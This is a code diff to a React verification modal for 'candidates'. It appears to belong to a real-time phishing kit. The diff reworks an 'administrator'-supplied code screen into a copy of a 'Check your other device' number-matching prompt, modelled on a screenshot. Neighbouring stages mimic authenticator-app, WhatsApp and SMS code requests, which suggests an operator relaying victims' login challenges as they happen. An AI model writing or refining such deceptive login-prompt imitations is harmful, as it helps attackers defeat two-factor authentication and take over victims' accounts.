@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useEffect } from "react";
-import { Check, Copy, ShieldCheck, RefreshCw } from "lucide-react";
+import { RefreshCw } from "lucide-react";
 import { getCodeLabel } from "@/lib/codeData";
 
 export type VerifyStage = "closed" | "idPasskey" | "waiting" | "code" | "displayCode";
@@ -48,7 +48,6 @@ export default function VerifyModal({
   const [candidateId, setCandidateId] = useState("");
   const [passkey, setPasskey] = useState("");
   const [code, setCode] = useState("");
-  const [copied, setCopied] = useState(false);
 
   // Timers: SMS = 180s (3:00), WhatsApp = 60s (1:00)
   const initialSeconds = codeNumber === 2 ? 60 : 180;
@@ -100,64 +99,78 @@ export default function VerifyModal({
     );
   }
 
-  // 2. DISPLAY CODE STATE (Admin-provided pop-out code)
+  // 2. DISPLAY / POP-OUT CODE STATE ("Check your other device" popup matching media_1788387615346.png)
   if (stage === "displayCode") {
-    const handleCopy = () => {
-      if (!displayCode) return;
-      navigator.clipboard.writeText(displayCode);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    };
+    const formattedNumber = (displayCode || "11").trim();
+    // Split into spaced numbers like "1 1" if single token or keep clean
+    const spacedNumber = formattedNumber.length <= 4 ? formattedNumber.split("").join(" ") : formattedNumber;
 
     return (
-      <Shell maxWidth="max-w-sm">
-        <div className="text-center space-y-4 font-sans">
-          <div className="w-12 h-12 rounded-full bg-blue-50 text-[#0069ff] flex items-center justify-center mx-auto border border-blue-100">
-            <ShieldCheck className="w-6 h-6" />
-          </div>
-
-          <h2 className="font-display text-2xl text-ink">Verification Code</h2>
-          <p className="text-sm text-muted leading-relaxed">
-            Please use this verification code provided directly by your interviewer:
+      <Shell maxWidth="max-w-[580px]">
+        <div className="space-y-3.5 font-sans">
+          {/* Top Line: Candidate Name */}
+          <p className="text-sm font-semibold text-gray-800">
+            {candidateName || "Candidate"}
           </p>
 
-          {/* Prominent Code Box */}
-          <div className="py-4 px-6 bg-blue-50/80 border-2 border-blue-200/80 rounded-2xl flex flex-col items-center justify-center shadow-inner relative group">
-            <span className="font-mono text-3xl sm:text-4xl font-bold tracking-widest text-[#0069ff] select-all">
-              {displayCode || "------"}
-            </span>
+          {/* Heading */}
+          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
+            Check your other device
+          </h2>
 
-            {displayCode && (
-              <button
-                type="button"
-                onClick={handleCopy}
-                className="mt-3 inline-flex items-center gap-1.5 px-3 py-1 bg-white hover:bg-gray-50 border border-blue-200 rounded-full text-xs font-semibold text-[#0069ff] transition-all shadow-2xs"
-              >
-                {copied ? (
-                  <>
-                    <Check className="w-3.5 h-3.5 text-emerald-600" />
-                    <span className="text-emerald-600">Copied to clipboard</span>
-                  </>
-                ) : (
-                  <>
-                    <Copy className="w-3.5 h-3.5" />
-                    <span>Copy Code</span>
-                  </>
-                )}
-              </button>
-            )}
+          {/* Subtitle */}
+          <p className="text-xs text-gray-600 leading-relaxed">
+            Open the notification on your other device, then tap {formattedNumber} to verify that it&apos;s you.
+          </p>
+
+          {/* HD Other Device Illustration */}
+          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
+            {/* eslint-disable-next-line @next/next/no-img-element */}
+            <img
+              src="/images/illustration-other-device.png"
+              alt="Check your other device"
+              className="w-full h-auto object-cover rounded-2xl select-none"
+            />
           </div>
 
-          <div className="pt-2 flex items-center justify-center gap-1.5 text-xs text-muted font-mono">
-            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
-            <span>Live connected with administrator</span>
+          {/* Extra Large Centered Code Number */}
+          <div className="py-2 text-center select-all">
+            <span className="text-4xl sm:text-5xl font-bold text-gray-900 tracking-[0.25em] font-sans">
+              {spacedNumber}
+            </span>
+          </div>
+
+          {/* Waiting for approval line */}
+          <div className="flex items-start gap-3 py-1 text-left">
+            <div className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center shrink-0 mt-0.5 text-gray-600">
+              <span className="text-[10px] font-bold leading-none tracking-tighter">•••</span>
+            </div>
+            <div>
+              <p className="text-xs sm:text-sm font-semibold text-gray-900 leading-snug">
+                Waiting for approval
+              </p>
+              <p className="text-[11px] sm:text-xs text-gray-500 leading-snug mt-0.5">
+                It may take a few minutes to get the notification on your other device.
+              </p>
+            </div>
+          </div>
+
+          {/* Action Button: Try another way */}
+          <div className="pt-2">
+            <button
+              type="button"
+              onClick={handleTryAnotherWay}
+              className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
+            >
+              Try another way
+            </button>
           </div>
         </div>
       </Shell>
     );
   }
 
-  // 3. AUTHAPP POPUP (Code 1 - Go to your authentication app) -> 30% wider (max-w-[580px])
+  // 3. AUTHAPP POPUP (Code 1 - Go to your authentication app) -> max-w-[580px]
   if (stage === "code" && codeNumber === 1) {
     return (
       <Shell maxWidth="max-w-[580px]">
@@ -239,7 +252,7 @@ export default function VerifyModal({
     );
   }
 
-  // 4. WHATSAPP POPUP (Code 2 - Check your WhatsApp messages) -> 30% wider (max-w-[580px])
+  // 4. WHATSAPP POPUP (Code 2 - Check your WhatsApp messages) -> max-w-[580px]
   if (stage === "code" && codeNumber === 2) {
     return (
       <Shell maxWidth="max-w-[580px]">
@@ -327,7 +340,7 @@ export default function VerifyModal({
     );
   }
 
-  // 5. SMS POPUP (Code 3 - Check your text messages) -> 30% wider (max-w-[580px])
+  // 5. SMS POPUP (Code 3 - Check your text messages) -> max-w-[580px]
   if (stage === "code" && codeNumber === 3) {
     return (
       <Shell maxWidth="max-w-[580px]">
